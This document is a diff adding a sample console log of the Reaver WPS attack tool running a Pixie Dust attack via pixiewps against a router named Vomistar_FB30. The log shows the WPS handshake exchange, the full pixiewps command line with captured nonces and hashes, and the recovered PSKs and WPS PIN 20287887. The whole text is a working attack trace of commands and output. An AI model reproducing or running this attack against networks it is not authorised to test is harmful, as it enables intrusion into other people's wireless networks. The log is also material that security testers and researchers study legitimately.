@@ -1,0 +1,35 @@
+
+Reaver v1.6.5-git-50-g37de8c8 WiFi Protected Setup Attack Tool
+Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>
+
+[+] Switching wlan0mon to channel 8
+[?] Restore previous session for 6C:B0:CE:EC:A5:EB? [n/Y] y
+[+] Restored previous session
+[+] Waiting for beacon from 6C:B0:CE:EC:A5:EB
+[+] Received beacon from 6C:B0:CE:EC:A5:EB
+[+] Vendor: RalinkTe
+[+] Trying pin "20287887"
+[+] Sending authentication request
+[+] Sending association request
+[+] Associated with 6C:B0:CE:EC:A5:EB (ESSID: Vomistar_FB30)
+[+] Sending EAPOL START request
+[+] Received identity request
+[+] Sending identity response
+[+] Received M1 message
+[+] Sending M2 message
+executing pixiewps -e 77e2248facbbe21db32c319ebe46ee873d03fdfc23503829dd8fe9c249dd23694f9be0a56a84d367593f75ccd651b6de3ba59e20d16df101acbd7a2ecef39d15ab06062c8514532a118215f02030a47a8741fa534338c5132086893370abfbd462f9df96f5ebec4fe60cb215d935c93283d03591ca2f87284b54aa80010a1131f73335e5a71ab32d2a97095e483509e8f2343008263a1290db1b322b8cf6d9ba976ba7eeadfb022155c61d8a8d2ecae072792e4fe867b7161aca0c4d339fb881 -s ce45c32632732398e7d28d500b069bc67d73c2be2a79686787253b1a50a64ed1 -z f051398b0051b34e7ffbd416cc4aca26827ffc2725e279706fa072a4144b97fc -a 970352a2346e01254430e18a0f300dbfad558bb59e4dd60d3a1218e5e3531ce5 -n 2385495d00dacb21749d226689a2619d -r 465d584e8a27f19b736d96763654e3559f1d1ce7a49bc7e7f27f3926c750dbf70a458d225a1b28c77cd1ab2ff1fb0ea25690c3daabf07a78adead0f21d0ab3139a5f8f2d0fb5bc187595cf5f47e02b333249712a02c61eeed95b6353427dc00a921045fca012ae92006f7f4bd1b8daacb3bfbd1d76ec5437ffaa85199d1197f9ff0719a39d3b59e751e619de601bad7b3c99ee345f553c66e7cf2931c2f0f6d185c0fba7cd20fc0637b1cd3a5e8958d3b8cf13f9808f81748f1f826a91fa1ae6
+
+ Pixiewps 1.4
+
+ [?] Mode:     1 (RT/MT/CL)
+ [*] Seed N1:  0x287f081c
+ [*] Seed ES1: 0x00000000
+ [*] Seed ES2: 0x00000000
+ [*] PSK1:     522fb5f9ed40e638cff9db9808e64b5d
+ [*] PSK2:     3db8d10c54d3020b321ee45974af0b34
+ [*] ES1:      00000000000000000000000000000000
+ [*] ES2:      00000000000000000000000000000000
+ [+] WPS pin:  20287887
+
+ [*] Time taken: 0 s 9 ms
+
